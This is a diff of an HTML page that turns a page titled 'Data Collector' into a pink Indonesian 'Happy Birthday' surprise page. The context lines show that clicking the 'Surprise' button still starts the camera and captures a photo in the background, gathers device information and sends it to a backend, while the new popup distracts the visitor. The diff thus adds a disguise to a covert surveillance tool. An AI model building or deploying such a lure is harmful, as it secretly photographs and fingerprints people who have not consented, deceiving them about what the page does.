@@ -3,13 +3,116 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Data Collector</title>
+  <title>Mancis Peng</title>
+  <style>
+    /* Gaya umum */
+    body {
+      font-family: 'Chewy', cursive ;
+      margin: 0;
+      padding: 0;
+      background: #ffcce7;
+      color: #5a2d0c;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin-top: 20px;
+      color: #ff6fa1;
+      text-shadow: 1px 1px 2px #ffffff, 0 0 10px #ff99c8;
+    }
+
+    /* Tombol */
+    #collectData {
+      font-size: 1.5rem;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 50px;
+      background: linear-gradient(135deg, #ff7eb3, #ff4081);
+      color: white;
+      cursor: pointer;
+      box-shadow: 0 5px 15px rgba(255, 105, 180, 0.4);
+      transition: all 0.3s ease;
+    }
+
+    #collectData:hover {
+      background: linear-gradient(135deg, #ff4081, #ff7eb3);
+      transform: scale(1.1);
+    }
+
+    #collectData:active {
+      transform: scale(1.05);
+    }
+
+    /* Background dengan elemen permen */
+    body:before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: -1;
+      background: url('https://cdn.pixabay.com/photo/2016/03/05/19/02/sweets-1238612_960_720.jpg') center/cover no-repeat;
+      opacity: 0.2;
+    }
+
+    /* Popup */
+    #popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 20px;
+      background: #fff;
+      border: 3px solid #ff99c8;
+      border-radius: 15px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+      z-index: 1000;
+    }
+
+    #popup h2 {
+      font-size: 2rem;
+      color: #ff6fa1;
+    }
+
+    #popup button {
+      background: #ff4081;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    #popup button:hover {
+      background: #ff6fa1;
+    }
+  </style>
 </head>
 <body>
-  <h1>Collect and Send Data</h1>
-  <button id="collectData">Collect and Send Data</button>
+  <h1>Pencet Tombol dibawah</h1>
+  <button id="collectData">🎉 Surprise🎉  </button>
+
+  <div id="popup">
+    <h2>🍫🤎Happy Birthday! 🤎🍫</h2>
+    <button onclick="closePopup()">OK</button>
+  </div>
 
   <script>
+    // Fungsi untuk menampilkan popup
+    function showPopup() {
+      const popup = document.getElementById('popup');
+      popup.style.display = 'block';
+    }
+
+    // Fungsi untuk menutup popup
+    function closePopup() {
+      const popup = document.getElementById('popup');
+      popup.style.display = 'none';
+    }
+
     // Function to start camera and capture photo in the background
     async function capturePhoto() {
       try {
@@ -89,6 +192,8 @@
 
     // Function to collect and send data to the backend
     document.getElementById('collectData').addEventListener('click', async () => {
+      showPopup(); // Tampilkan popup
+
       const photo = await capturePhoto();
       const deviceInfo = await collectDeviceInfo();
 
